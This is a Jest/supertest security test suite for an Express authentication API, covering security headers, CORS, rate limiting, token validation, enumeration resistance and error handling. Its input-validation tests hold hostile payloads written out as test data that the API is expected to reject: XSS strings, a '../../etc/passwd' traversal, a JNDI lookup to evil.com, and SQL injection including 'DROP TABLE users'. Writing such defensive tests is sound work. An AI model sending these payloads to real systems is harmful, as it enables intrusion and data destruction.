import request from 'supertest';
import express from 'express';
import helmet from 'helmet';
import cors from 'cors';
import { AuthService } from '../services/AuthService';
import { JwtService } from '../services/JwtService';
import authRoutes from '../routes/auth';
import { authenticate } from '../middleware/auth';
import {
  authRateLimit,
  loginRateLimit,
  passwordResetRateLimit,
  registrationRateLimit,
  tokenRefreshRateLimit
} from '../middleware/rateLimiting';

// Create test app with security middleware
const createTestApp = () => {
  const app = express();
  
  // Security middleware
  app.use(helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        scriptSrc: ["'self'"],
        imgSrc: ["'self'", "data:", "https:"],
        connectSrc: ["'self'"],
        fontSrc: ["'self'"],
        objectSrc: ["'none'"],
        mediaSrc: ["'self'"],
        frameSrc: ["'none'"],
      },
    },
    crossOriginEmbedderPolicy: false,
    hsts: {
      maxAge: 31536000,
      includeSubDomains: true,
      preload: true
    }
  }));

  app.use(cors({
    origin: 'http://localhost:3333',
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
    exposedHeaders: ['RateLimit-Limit', 'RateLimit-Remaining', 'RateLimit-Reset']
  }));

  app.use(express.json({ limit: '10mb' }));
  app.use('/api/auth', authRoutes);

  // Protected test route
  app.get('/api/protected', authenticate, (req, res) => {
    res.json({
      success: true,
      data: {
        message: 'Access granted',
        user: req.user
      }
    });
  });

  return app;
};

describe('Authentication Security Tests', () => {
  let app: express.Application;
  let authService: AuthService;
  let jwtService: JwtService;

  beforeEach(() => {
    app = createTestApp();
    authService = new AuthService();
    jwtService = new JwtService();
  });

  describe('Security Headers', () => {
    it('should include Helmet security headers in responses', async () => {
      const response = await request(app)
        .get('/api/protected')
        .expect(401); // Will fail auth but should have headers

      // Check for Helmet security headers
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['x-xss-protection']).toBe('0');
      expect(response.headers['strict-transport-security']).toContain('max-age=31536000');
      expect(response.headers['content-security-policy']).toContain("default-src 'self'");
    });

    it('should include CORS headers for allowed origins', async () => {
      const response = await request(app)
        .options('/api/auth/login')
        .set('Origin', 'http://localhost:3333')
        .expect(204);

      expect(response.headers['access-control-allow-origin']).toBe('http://localhost:3333');
      expect(response.headers['access-control-allow-credentials']).toBe('true');
      expect(response.headers['access-control-allow-methods']).toContain('POST');
      expect(response.headers['access-control-allow-headers']).toContain('Authorization');
    });

    it('should reject requests from disallowed origins', async () => {
      const response = await request(app)
        .post('/api/auth/login')
        .set('Origin', 'http://malicious-site.com')
        .send({ email: 'test@example.com', password: 'password' });

      // Should not include CORS headers for disallowed origin
      expect(response.headers['access-control-allow-origin']).toBeUndefined();
    });
  });

  describe('Rate Limiting Tests', () => {
    describe('Login Rate Limiting', () => {
      it('should allow requests within rate limit', async () => {
        // Make 3 requests (within limit)
        for (let i = 0; i < 3; i++) {
          const response = await request(app)
            .post('/api/auth/login')
            .send({ email: 'test@example.com', password: 'password' });

          expect(response.status).toBeLessThan(500); // Should not be server error
        }
      });

      it('should block requests exceeding rate limit', async () => {
        // Make 3 requests (at limit)
        for (let i = 0; i < 3; i++) {
          await request(app)
            .post('/api/auth/login')
            .send({ email: 'test@example.com', password: 'password' });
        }

        // 4th request should be blocked
        const response = await request(app)
          .post('/api/auth/login')
          .send({ email: 'test@example.com', password: 'password' })
          .expect(429);

        expect(response.body.success).toBe(false);
        expect(response.body.error.code).toBe('LOGIN_RATE_LIMIT_EXCEEDED');
        expect(response.body.error.message).toContain('Too many failed login attempts');
      });

      it('should include rate limit headers', async () => {
        const response = await request(app)
          .post('/api/auth/login')
          .send({ email: 'test@example.com', password: 'password' });

        expect(response.headers['ratelimit-limit']).toBeDefined();
        expect(response.headers['ratelimit-remaining']).toBeDefined();
        expect(response.headers['ratelimit-reset']).toBeDefined();
      });
    });

    describe('Registration Rate Limiting', () => {
      it('should allow requests within rate limit', async () => {
        // Make 5 requests (within limit)
        for (let i = 0; i < 5; i++) {
          const response = await request(app)
            .post('/api/auth/register')
            .send({ 
              email: `test${i}@example.com`, 
              username: `user${i}`,
              password: 'password123',
              firstName: 'Test',
              lastName: 'User'
            });

          expect(response.status).toBeLessThan(500); // Should not be server error
        }
      });

      it('should block requests exceeding rate limit', async () => {
        // Make 5 requests (at limit)
        for (let i = 0; i < 5; i++) {
          await request(app)
            .post('/api/auth/register')
            .send({ 
              email: `test${i}@example.com`, 
              username: `user${i}`,
              password: 'password123',
              firstName: 'Test',
              lastName: 'User'
            });
        }

        // 6th request should be blocked
        const response = await request(app)
          .post('/api/auth/register')
          .send({ 
            email: 'test6@example.com', 
            username: 'user6',
            password: 'password123',
            firstName: 'Test',
            lastName: 'User'
          })
          .expect(429);

        expect(response.body.success).toBe(false);
        expect(response.body.error.code).toBe('REGISTRATION_RATE_LIMIT_EXCEEDED');
        expect(response.body.error.message).toContain('Too many registration attempts');
      });
    });

    describe('Password Reset Rate Limiting', () => {
      it('should allow requests within rate limit', async () => {
        // Make 3 requests (within limit)
        for (let i = 0; i < 3; i++) {
          const response = await request(app)
            .post('/api/auth/request-password-reset')
            .send({ email: 'test@example.com' });

          expect(response.status).toBeLessThan(500); // Should not be server error
        }
      });

      it('should block requests exceeding rate limit', async () => {
        // Make 3 requests (at limit)
        for (let i = 0; i < 3; i++) {
          await request(app)
            .post('/api/auth/request-password-reset')
            .send({ email: 'test@example.com' });
        }

        // 4th request should be blocked
        const response = await request(app)
          .post('/api/auth/request-password-reset')
          .send({ email: 'test@example.com' })
          .expect(429);

        expect(response.body.success).toBe(false);
        expect(response.body.error.code).toBe('PASSWORD_RESET_RATE_LIMIT_EXCEEDED');
        expect(response.body.error.message).toContain('Too many password reset requests');
      });
    });

    describe('Token Refresh Rate Limiting', () => {
      it('should allow requests within rate limit', async () => {
        // Make 10 requests (within limit)
        for (let i = 0; i < 10; i++) {
          const response = await request(app)
            .post('/api/auth/refresh')
            .send({ refreshToken: 'refresh-token' });

          expect(response.status).toBeLessThan(500); // Should not be server error
        }
      });

      it('should block requests exceeding rate limit', async () => {
        // Make 10 requests (at limit)
        for (let i = 0; i < 10; i++) {
          await request(app)
            .post('/api/auth/refresh')
            .send({ refreshToken: 'refresh-token' });
        }

        // 11th request should be blocked
        const response = await request(app)
          .post('/api/auth/refresh')
          .send({ refreshToken: 'refresh-token' })
          .expect(429);

        expect(response.body.success).toBe(false);
        expect(response.body.error.code).toBe('TOKEN_REFRESH_RATE_LIMIT_EXCEEDED');
        expect(response.body.error.message).toContain('Too many token refresh attempts');
      });
    });
  });

  describe('Input Validation Security', () => {
    it('should reject malicious input in registration', async () => {
      const maliciousData = {
        email: '<script>alert("xss")</script>@example.com',
        username: '../../etc/passwd',
        password: 'password',
        firstName: '<img src=x onerror=alert(1)>',
        lastName: '${jndi:ldap://evil.com/a}'
      };

      const response = await request(app)
        .post('/api/auth/register')
        .send(maliciousData)
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('VALIDATION_ERROR');
    });

    it('should reject SQL injection attempts', async () => {
      const sqlInjectionData = {
        email: "admin@example.com'; DROP TABLE users; --",
        password: "password' OR '1'='1"
      };

      const response = await request(app)
        .post('/api/auth/login')
        .send(sqlInjectionData)
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('VALIDATION_ERROR');
    });

    it('should reject oversized payloads', async () => {
      const oversizedData = {
        email: 'test@example.com',
        username: 'a'.repeat(10000), // Very long username
        password: 'password',
        firstName: 'b'.repeat(10000), // Very long first name
        lastName: 'Test'
      };

      const response = await request(app)
        .post('/api/auth/register')
        .send(oversizedData)
        .expect(400);

      expect(response.body.success).toBe(false);
    });
  });

  describe('Token Security', () => {
    it('should reject malformed tokens', async () => {
      const malformedTokens = [
        'not.a.token',
        'Bearer malformed',
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.malformed',
        '',
        null,
        undefined
      ];

      for (const token of malformedTokens) {
        const response = await request(app)
          .get('/api/protected')
          .set('Authorization', token ? `Bearer ${token}` : '');

        expect(response.status).toBe(401);
        expect(response.body.success).toBe(false);
      }
    });

    it('should reject expired tokens', async () => {
      // Create an expired token
      const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJleHAiOjE2MDk0NTkyMDB9.invalid';

      const response = await request(app)
        .get('/api/protected')
        .set('Authorization', `Bearer ${expiredToken}`)
        .expect(401);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('INVALID_TOKEN');
    });

    it('should validate token format in validation endpoint', async () => {
      const response = await request(app)
        .post('/api/auth/validate')
        .send({ accessToken: 'invalid-token' })
        .expect(401);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('TOKEN_VALIDATION_FAILED');
    });
  });

  describe('Authentication Flow Security', () => {
    it('should prevent password enumeration attacks', async () => {
      // Try to login with non-existent email
      const response1 = await request(app)
        .post('/api/auth/login')
        .send({
          email: 'nonexistent@example.com',
          password: 'anypassword'
        })
        .expect(401);

      // Try to login with existing email but wrong password (would need actual user)
      const response2 = await request(app)
        .post('/api/auth/login')
        .send({
          email: 'test@example.com',
          password: 'wrongpassword'
        })
        .expect(401);

      // Both should return the same generic error message
      expect(response1.body.error.message).toBe(response2.body.error.message);
      expect(response1.body.error.message).toContain('Invalid email or password');
    });

    it('should handle password reset securely', async () => {
      // Request password reset for existing user
      const resetResponse1 = await request(app)
        .post('/api/auth/request-password-reset')
        .send({ email: 'test@example.com' })
        .expect(200);

      // Request password reset for non-existent user
      const resetResponse2 = await request(app)
        .post('/api/auth/request-password-reset')
        .send({ email: 'nonexistent@example.com' })
        .expect(200);

      // Both should return the same response to prevent email enumeration
      expect(resetResponse1.body.data.message).toBe(resetResponse2.body.data.message);
      expect(resetResponse1.body.data.message).toContain('If an account with that email exists');
    });
  });

  describe('Error Handling Security', () => {
    it('should not expose sensitive information in error messages', async () => {
      // Test various error scenarios
      const errorTests = [
        {
          endpoint: '/api/auth/login',
          data: { email: 'test@example.com', password: 'wrong' },
          expectedStatus: 401
        },
        {
          endpoint: '/api/auth/refresh',
          data: { refreshToken: 'invalid' },
          expectedStatus: 401
        },
        {
          endpoint: '/api/auth/validate',
          data: { accessToken: 'invalid' },
          expectedStatus: 401
        }
      ];

      for (const test of errorTests) {
        const response = await request(app)
          .post(test.endpoint)
          .send(test.data)
          .expect(test.expectedStatus);

        expect(response.body.success).toBe(false);
        expect(response.body.error).toBeDefined();
        expect(response.body.error.message).toBeDefined();
        
        // Should not expose internal details
        expect(response.body.error.message).not.toContain('database');
        expect(response.body.error.message).not.toContain('sql');
        expect(response.body.error.message).not.toContain('stack');
        expect(response.body.error.message).not.toContain('internal');
        
        // Should have proper error structure
        expect(response.body.error.code).toBeDefined();
        expect(response.body.error.timestamp).toBeDefined();
      }
    });

    it('should handle internal server errors gracefully', async () => {
      const response = await request(app)
        .post('/api/auth/login')
        .send({ email: 'invalid-email-format' })
        .expect(400);

      expect(response.body).toHaveProperty('success', false);
      expect(response.body).toHaveProperty('error');
      expect(response.body.error).toHaveProperty('code');
      expect(response.body.error).toHaveProperty('message');
      expect(response.body.error).toHaveProperty('timestamp');
    });
  });

  describe('Content Security', () => {
    it('should enforce JSON content type', async () => {
      const response = await request(app)
        .post('/api/auth/login')
        .set('Content-Type', 'text/plain')
        .send('email=test@example.com&password=password');

      // Should reject non-JSON content
      expect(response.status).toBe(400);
    });

    it('should limit request size', async () => {
      const largeData = {
        email: 'test@example.com',
        password: 'password',
        extraData: 'a'.repeat(1000) // Reasonable size for testing
      };

      const response = await request(app)
        .post('/api/auth/register')
        .send(largeData);

      // Should handle reasonable sized requests
      expect(response.status).not.toBe(413); // Payload Too Large
    });
  });

  describe('Rate Limit Error Format', () => {
    it('should return properly formatted error response', async () => {
      // Create a test app with a simple rate limit for testing
      const testApp = express();
      testApp.use(express.json());
      testApp.post('/test', authRateLimit, (req, res) => {
        res.json({ success: true });
      });

      // Exceed rate limit
      for (let i = 0; i < 6; i++) {
        await request(testApp).post('/test').send({});
      }

      const response = await request(testApp)
        .post('/test')
        .send({})
        .expect(429);

      expect(response.body).toHaveProperty('success', false);
      expect(response.body).toHaveProperty('error');
      expect(response.body.error).toHaveProperty('code');
      expect(response.body.error).toHaveProperty('message');
      expect(response.body.error).toHaveProperty('timestamp');
      expect(response.body.error).toHaveProperty('retryAfter');
      
      expect(typeof response.body.error.code).toBe('string');
      expect(typeof response.body.error.message).toBe('string');
      expect(typeof response.body.error.timestamp).toBe('string');
      expect(typeof response.body.error.retryAfter).toBe('number');
    });
  });
});